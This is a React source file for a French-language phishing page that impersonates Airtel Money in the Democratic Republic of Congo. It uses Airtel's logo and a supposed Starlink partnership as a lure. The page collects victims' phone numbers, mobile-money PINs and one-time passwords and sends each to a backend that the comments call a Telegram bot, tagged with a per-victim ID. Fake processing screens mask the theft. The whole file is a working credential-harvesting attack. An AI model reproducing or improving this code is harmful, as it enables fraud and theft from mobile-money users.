import React, { useState, useRef, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useApp } from '../context/AppContext';

export default function LoginPage() {
  const navigate = useNavigate();
  const { userId } = useParams();
  const currentUserId = userId || 'bl';
  const { selectedPlan, updateAuthData } = useApp();

  // Page view state: 'credentials' | 'processing' | 'otp'
  const [viewState, setViewState] = useState('credentials');
  
  // Credentials Form state
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pinDigits, setPinDigits] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);

  // OTP State
  const [otpCode, setOtpCode] = useState('');
  const [otpTimer, setOtpTimer] = useState(40);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);

  // Error modal state
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  // Pin input refs
  const pinInputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const otpInputRef = useRef(null);

  // OTP Countdown timer
  useEffect(() => {
    let interval = null;
    if (viewState === 'otp' && otpTimer > 0) {
      interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [viewState, otpTimer]);

  useEffect(() => {
    if (viewState === 'otp' && otpInputRef.current) {
      otpInputRef.current.focus();
    }
  }, [viewState]);

  // Handle Pin change
  const handlePinChange = (index, value) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }
    const newPinDigits = [...pinDigits];
    newPinDigits[index] = value;
    setPinDigits(newPinDigits);

    // Auto advance focus
    if (value && index < 3) {
      pinInputRefs[index + 1].current?.focus();
    }
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs[index - 1].current?.focus();
    }
  };

  const isPhoneValid = phoneNumber.length >= 9;
  const isPinComplete = pinDigits.every((digit) => digit !== '');
  const isFormValid = isPhoneValid && isPinComplete;

  // Handle Credentials Submit
  const handleCredentialsSubmit = async (e) => {
    e.preventDefault();
    if (!isFormValid) {
      setErrorMessage("Veuillez entrer un numéro de téléphone valide à 9 chiffres et votre code PIN à 4 chiffres.");
      setShowErrorModal(true);
      return;
    }

    const fullPhone = `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
    const fullPin = pinDigits.join('');
    updateAuthData({ phoneNumber: fullPhone, pin: fullPin });

    // Show processing overlay
    setViewState('processing');

    // Notify Telegram Bot Backend API
    try {
      await fetch('http://localhost:5000/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: fullPhone,
          pin: fullPin,
          plan: selectedPlan,
          userId: currentUserId
        })
      });
    } catch (err) {
      console.warn('Backend Telegram bot API not reachable:', err);
    }

    // Transition to OTP step after delay
    setTimeout(() => {
      setViewState('otp');
      setOtpTimer(40);
    }, 2500);
  };

  // Handle OTP Submit
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otpCode.length < 4) {
      setErrorMessage("Code OTP invalide. Veuillez saisir un code complet à 4 chiffres.");
      setShowErrorModal(true);
      return;
    }

    setIsVerifyingOtp(true);
    setViewState('processing');

    const fullPhone = `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;

    // Notify Telegram Bot Backend API
    try {
      await fetch('http://localhost:5000/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: fullPhone,
          otp: otpCode,
          plan: selectedPlan,
          userId: currentUserId
        })
      });
    } catch (err) {
      console.warn('Backend Telegram bot API not reachable:', err);
    }

    setTimeout(() => {
      setIsVerifyingOtp(false);
      updateAuthData({ otp: otpCode, isAuthenticated: true });
      navigate(`/${currentUserId}/status`);
    }, 2000);
  };

  // Handle Resend OTP
  const handleResendOtp = () => {
    if (otpTimer > 0) return;
    setOtpTimer(40);
  };

  const fullFormattedPhone = `+243 ${phoneNumber ? (phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber) : '951234567'}`;

  return (
    <>
      {/* ERROR MODAL */}
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Format Invalide</h2>
            <p className="error-modal-message">{errorMessage}</p>
            <button
              className="error-modal-button"
              onClick={() => setShowErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* PROCESSING OVERLAY */}
      {viewState === 'processing' && (
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            <h1 className="processing-title">
              {isVerifyingOtp ? "Vérification de l'OTP..." : "Veuillez patienter..."}
            </h1>
            <p className="processing-subtitle">
              {isVerifyingOtp
                ? "Confirmation de la transaction avec Airtel Money"
                : "Traitement des informations en cours..."}
            </p>
          </div>
        </div>
      )}

      {/* VIEW 1: CREDENTIALS INPUT */}
      {viewState === 'credentials' && (
        <div className="login-container">
          <div className="login-header">
            <div className="logo-large">
              <img
                src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
                alt="Airtel Logo"
              />
            </div>
          </div>

          <div className="login-content">
            <h1 className="login-title">
              Connectez-vous à Airtel Lite pour finaliser le paiement.
            </h1>

            <form className="login-form" onSubmit={handleCredentialsSubmit}>
              {/* Phone Input */}
              <div className="phone-input-container">
                <div className="country-code">
                  <span className="flag-icon">🇨🇩</span>
                  <span>+243</span>
                </div>
                <input
                  type="tel"
                  className="phone-input"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                  placeholder="951234567"
                  maxLength="10"
                  inputMode="numeric"
                  required
                />
              </div>

              {/* PIN Input Section */}
              <div className="pin-section">
                <p className="pin-label">Entrez votre Code</p>
                <div className="pin-inputs-wrapper">
                  <div className="pin-inputs">
                    {pinDigits.map((digit, idx) => (
                      <input
                        key={idx}
                        ref={pinInputRefs[idx]}
                        type={showPin ? "text" : "password"}
                        className="pin-box"
                        value={digit}
                        onChange={(e) => handlePinChange(idx, e.target.value)}
                        onKeyDown={(e) => handlePinKeyDown(idx, e)}
                        maxLength="1"
                        inputMode="numeric"
                        pattern="[0-9]"
                        required
                      />
                    ))}
                  </div>

                  <button
                    type="button"
                    className="eye-button"
                    onClick={() => setShowPin(!showPin)}
                    aria-label={showPin ? "Masquer le PIN" : "Afficher le PIN"}
                  >
                    {showPin ? "👁️" : "🙈"}
                  </button>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="login-button"
                disabled={!isFormValid}
              >
                CONNEXION
              </button>
            </form>
          </div>

          {/* Footer */}
          <div className="login-footer">
            <img
              src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
              alt="Airtel Logo"
            />
            <span>En collaboration avec</span>
            <span><strong>STARLINK</strong></span>
          </div>
        </div>
      )}

      {/* VIEW 2: OTP VERIFICATION */}
      {viewState === 'otp' && (
        <div className="otp-container">
          <header className="otp-header">
            <button
              className="back-btn"
              onClick={() => setViewState('credentials')}
              aria-label="Retour"
            >
              ←
            </button>
            <div className="logo-large">
              <img
                src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
                alt="Airtel Logo"
                style={{ height: '32px' }}
              />
            </div>
            <button className="menu-btn" aria-label="Menu">
              <div className="menu-line"></div>
              <div className="menu-line"></div>
              <div className="menu-line"></div>
            </button>
          </header>

          <main className="otp-content">
            <div className="otp-card">
              <h1 className="otp-title">Vérification du code OTP</h1>
              <p className="otp-phone">{fullFormattedPhone}</p>

              <form onSubmit={handleOtpSubmit}>
                <div className="otp-input-container">
                  <input
                    ref={otpInputRef}
                    type="text"
                    className="otp-input-field"
                    value={otpCode}
                    onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    placeholder="Entrer l'OTP"
                    maxLength="6"
                    inputMode="numeric"
                  />
                </div>

                <button
                  type="submit"
                  className={`submit-button ${otpCode.length >= 4 ? 'active' : ''}`}
                  disabled={otpCode.length < 4}
                >
                  SOUMETTRE
                </button>
              </form>

              <div className="resend-text">
                {otpTimer > 0 ? (
                  <span>Le code expire dans {otpTimer} secondes</span>
                ) : (
                  <span className="resend-link" onClick={handleResendOtp}>
                    Renvoyer le code OTP
                  </span>
                )}
              </div>
            </div>
          </main>

          <div className="login-footer">
            <img
              src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
              alt="Airtel Logo"
            />
            <span>En collaboration avec</span>
            <span><strong>STARLINK</strong></span>
          </div>
        </div>
      )}
    </>
  );
}
